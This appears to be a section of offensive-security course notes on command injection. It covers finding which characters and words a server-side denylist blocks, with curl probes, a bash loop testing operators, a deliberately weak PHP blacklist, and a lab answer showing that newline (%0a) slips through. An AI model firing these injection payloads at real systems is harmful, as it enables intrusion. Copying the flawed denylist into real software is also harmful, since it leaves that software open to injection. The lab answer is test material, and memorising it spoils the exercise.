# Section 5 — Identifying Filters

---

## How Filters Show Up

When the server has a denylist of characters/commands, attempted injection produces one of:

| Symptom | Probable filter location |
|---------|--------------------------|
| `Invalid input` (or similar) in the output area where ping result usually is | Server-side application denylist |
| HTTP 403 / blocked page with attacker IP | WAF (ModSecurity, Cloudflare, etc.) |
| Generic error or "Something went wrong" | Server-side framework filter |
| Request 200 but no execution | Silent filter — character stripped before exec |
| Response delay | Server processed but blocked output |

---

## Reducing Payloads to Identify the Block

Don't throw the full `127.0.0.1; whoami` payload at the filter — narrow it down:

```bash
# 1. Confirm valid IP works
curl -X POST "http://TARGET/" -d "ip=127.0.0.1"

# 2. Add ONE suspicious char at a time
curl -X POST "http://TARGET/" -d "ip=127.0.0.1;"     # is ; blocked?
curl -X POST "http://TARGET/" -d "ip=127.0.0.1|"     # is | blocked?
curl -X POST "http://TARGET/" -d "ip=127.0.0.1 "     # is space blocked?

# 3. Test injected commands without operators
curl -X POST "http://TARGET/" -d "ip=whoami"          # is whoami blocked?
curl -X POST "http://TARGET/" -d "ip=cat"             # cat blocked?
```

The principle: isolate ONE variable. If `127.0.0.1;whoami` is blocked but `127.0.0.1;` passes, the WORD `whoami` is the blocked element, not the `;`.

---

## Per-Operator Test (batch script)

```bash
# Test each operator alone (no second command — isolates operator filter)
for pair in "%0a:newline" "%26:&" "%7c:|" "%3b:;" "%26%26:&&" "%7c%7c:||"; do
  op="${pair%:*}"
  name="${pair#*:}"
  resp=$(curl -sk -X POST "http://TARGET/" -d "ip=127.0.0.1${op}")
  if echo "$resp" | grep -q 'Invalid input'; then
    echo "[$name ($op)] BLOCKED"
  else
    echo "[$name ($op)] ALLOWED"
  fi
done
```

Whatever passes is your operator. Then layer in test commands one at a time.

---

## Two-Dimension Test Matrix

When you have both operator filter AND command filter, build a small grid:

| | `whoami` | `id` | `cat` | (empty) |
|---|---|---|---|---|
| `;` | | | | |
| `\n` | | | | |
| `\|` | | | | |
| `&` | | | | |

Cells with "no Invalid input" are the bypass combos. Often only one cell works.

---

## Blacklist Code Pattern

What's running on the server (simplified):
```php
$blacklist = ['&', '|', ';'];
foreach ($blacklist as $c) {
    if (strpos($_POST['ip'], $c) !== false) {
        echo "Invalid input"; die();
    }
}
$blacklist_words = ['whoami', 'id', 'cat'];
foreach ($blacklist_words as $w) {
    if (strpos($_POST['ip'], $w) !== false) {
        echo "Invalid input"; die();
    }
}
```

The fix is whitelist-only validation or `escapeshellarg()`. The bypass is finding the gaps.

---

## Lab — Find the Allowed Operator

**Target:** `154.57.164.73:30363`

Same Host Checker app, now with server-side filter.

### Test each operator alone (isolate from command filter)
```bash
for pair in "%0a:newline" "%26:&" "%7c:|"; do
  op="${pair%:*}"
  name="${pair#*:}"
  resp=$(curl -sk -X POST "http://154.57.164.73:30363/" -d "ip=127.0.0.1${op}")
  if echo "$resp" | grep -q 'Invalid input'; then
    echo "[$name] BLOCKED"
  else
    echo "[$name] ALLOWED"
  fi
done
```

Result:
```
[newline] ALLOWED    ← only one that passes
[&]       BLOCKED
[|]       BLOCKED
```

**Q1 Answer:** `newline` (`\n` / `%0a`)

> Newline is often missed by character denylists because:
> - Lazy regex like `[;&|]` doesn't include `\n`
> - String comparison doesn't see `\n` as a "shell special char"
> - URL encoding (`%0a`) hides it from cursory log review

---

## Exam Notes

- **Test operators IN ISOLATION** before combining with commands — saves time figuring out which filter is which
- Newline (`%0a`) is the **most overlooked** operator on character denylists — try it first when standard ones are blocked
- WAF vs application-level filter: app-level shows the error in the output area; WAF shows a separate block page
- Build a test matrix when multiple filters are stacked — single-test-per-cell is faster than throwing combined payloads
- Filter responses are usually fast — 200ms latency = app filter; 5-30s = backend reject after processing
- For real engagements: confirm the filter source (`Invalid input` vs `403 Forbidden` vs `Cloudflare blocked`) before designing bypass — different defenders, different bypasses
